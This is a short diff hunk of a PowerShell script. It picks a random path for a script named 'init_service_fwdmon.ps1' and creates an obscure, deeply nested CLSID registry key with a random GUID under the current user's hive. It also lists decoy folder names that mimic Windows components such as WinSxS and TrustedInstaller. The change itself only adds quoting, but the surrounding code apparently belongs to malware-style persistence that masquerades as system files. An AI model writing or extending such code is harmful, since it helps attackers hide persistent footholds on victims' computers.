@@ -8,8 +8,8 @@ $initServiceFwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initServiceFwdmonPath = "$initServiceFwdmonPath\init_service_fwdmon.ps1"
 $g = "{$([guid]::NewGuid().ToString().ToUpper())}"
 $basePath = "HKCU:\Software\Classes\CLSID\$g\Shell\Open\Command\DelegateExecute\Cache\Backup\Runtime\Legacy\system"
-New-Item -Path $basePath -Force
-New-ItemProperty -Path $basePath -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
+New-Item -Path "$basePath" -Force
+New-ItemProperty -Path "$basePath" -Name "mode" -PropertyType DWORD -Value 0xFFFFFFFF -Force | Out-Null
 $ms = @("WinSxS_Backup", "System32_Compat", "TrustedInstallerCache", "Edge_Telemetry", "DirectX_Logs") 
 $p = Get-Random -Count 5 -In (1..100)
 $score = Get-Random -Minimum 1 -Maximum 100
